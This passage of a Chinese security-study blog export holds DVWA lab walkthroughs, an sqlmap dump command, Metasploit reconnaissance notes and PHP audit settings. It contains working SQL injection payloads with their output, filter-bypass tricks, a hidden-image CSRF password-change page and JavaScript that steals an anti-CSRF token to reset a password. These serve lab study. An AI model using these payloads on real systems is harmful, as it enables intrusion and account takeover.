presentVec[i]] + presentVec[i] &gt; dp[j]: <span class="comment">#判断是否最优，更新背包</span></span><br><span class="line">                dp[j] = dp[j - presentVec[i]] + presentVec[i]</span><br><span class="line">                <span class="comment">#print(dp[j])</span></span><br><span class="line">    maxvalue = dp[one_person]</span><br><span class="line">    <span class="keyword">return</span> abs(maxvalue - (volumn - maxvalue))</span><br></pre></td></tr></table></figure>











]]></content>
  </entry>
  <entry>
    <title>常见渗透工具的使用</title>
    <url>/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Sqlmap</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://127.0.0.1:10020/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit<span class="comment">#" --cookie="PHPSESSID=f6oa4chdloerj0r4tsljil0i06; security=low" --batch -D dvwa -T users -C "user,password" --dump</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA</title>
    <url>/2020/04/02/DVWA/</url>
    <content><![CDATA[<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>

<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">

<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
<p>在^没有被过滤的时候可以利用它来测试</p>
<p>异或：xor或^</p>
<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
<p>例如：1^0 就是 1 ，1^1 就是 0</p>
<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
<p>二、简单的sql绕过</p>
<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
<p>一些绕过的方法：</p>
<p>1、 大小写混写</p>
<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
<p>4、使用&amp;&amp; || 代替and or</p>
<p>5、双写关键字 aandnd</p>
<p>6、绕过空格：用tab键代替空格</p>
<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
<p>用括号 id=1(and)1=1</p>
<p>7、=用like、rlike、等代替</p>
<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>

<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>

<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
<p>构造页面test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>只要引诱别人点击此，就可成功修改其密码。</p>
<p><strong>黑盒测试：</strong></p>
<p><strong>抓包查看有没有token</strong></p>
<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
<p>抓包分析，发现有refer</p>
<p>删除refer观察发现返回结果一致</p>
<p>直接构造url，欺骗用户点击即可。</p>
<hr>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防CSRF攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>

<p>Referer参数的值，表示来源地址</p>
<p>Host：请求资源所在服务器</p>
<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
<p><strong>绕过方式：</strong></p>
<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
<p>成功包含host，即可绕过。</p>
<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
<hr>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防护机制：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>

<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
<p>攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>Metasploit魔鬼训练营</title>
    <url>/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/</url>
    <content><![CDATA[<h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
<p>PTES渗透测试标准，具体包括7个阶段：</p>
<p><strong>1.前期交互截断</strong></p>
<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
<p><strong>2.情报收集阶段</strong></p>
<p><strong>3.威胁建模阶段</strong></p>
<p><strong>4.漏洞分析阶段</strong></p>
<p><strong>5.渗透攻击阶段</strong></p>
<p><strong>6.后渗透攻击阶段</strong></p>
<p><strong>7.报告阶段</strong></p>
<h2 id="二、相关命令"><a href="#二、相关命令" class="headerlink" title="二、相关命令"></a><strong>二、相关命令</strong></h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><h4 id="whois域名注册信息查询"><a href="#whois域名注册信息查询" class="headerlink" title="whois域名注册信息查询"></a><strong>whois</strong>域名注册信息查询</h4><p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>

<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
<hr>
<h4 id="nslookup与dig域名查询"><a href="#nslookup与dig域名查询" class="headerlink" title="nslookup与dig域名查询"></a>nslookup与dig域名查询</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53989</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;testfire.net.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line"></span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="PHP核心配值解释"><a href="#PHP核心配值解释" class="headerlink" title="PHP核心配值解释"></a>PHP核心配值解释</h2><p>​                                                                       <strong>PHP_INI_* 模式的定义</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><em>PHP_INI_USER</em></td>
<td>可在用户脚本（例如  ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_PERDIR</em></td>
<td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_SYSTEM</em></td>
<td>可在 php.ini 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_ALL</em></td>
<td>可在任何地方设定</td>
</tr>
<tr>
<td><em>php_ini only</em></td>
<td>仅可在php.ini中配值</td>
</tr>
</tbody></table>
<h3 id="1-register-globals-全局变量注册开关"><a href="#1-register-globals-全局变量注册开关" class="headerlink" title="1.register_globals(全局变量注册开关)"></a><strong>1.register_globals(全局变量注册开关)</strong></h3><p>on——会直接把拥护GET、POST等方式提交上来的参数注册成全局变量，并初始化值为参数对应的值，使得题交参数可以直接在脚本中使用。</p>
<p>PHP5.4.0以下的版本可以正常使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">

<h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">

<h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
<p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
<p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
<p>PHP版本小于4.2.3时，配值范围是PHP_INI_ALL</p>
<p>PHP版本大于4.2.3时，是PHP_INI_PERDIR</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'chj'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.png" alt></p>
<h3 id="4-magic-quotes-runtime-魔术引号自动过滤"><a href="#4-magic-quotes-runtime-魔术引号自动过滤" class="headerlink" title="4.magic_quotes_runtime(魔术引号自动过滤)"></a><strong>4.magic_quotes_runtime(魔术引号自动过滤)</strong></h3><p>magic_quotes_runtime和magic_quotes_gpc功能一样，区别是处理的对象不一样</p>
<p>magic_quotes_runtime<strong>只对从数据库或者文件中获取的数据进行过滤</strong></p>
<p>由于很多人只对外部输入的数据进行过滤，所以有的攻击者可先将攻击代码写入数据库，在程序读取后即可触发攻击</p>
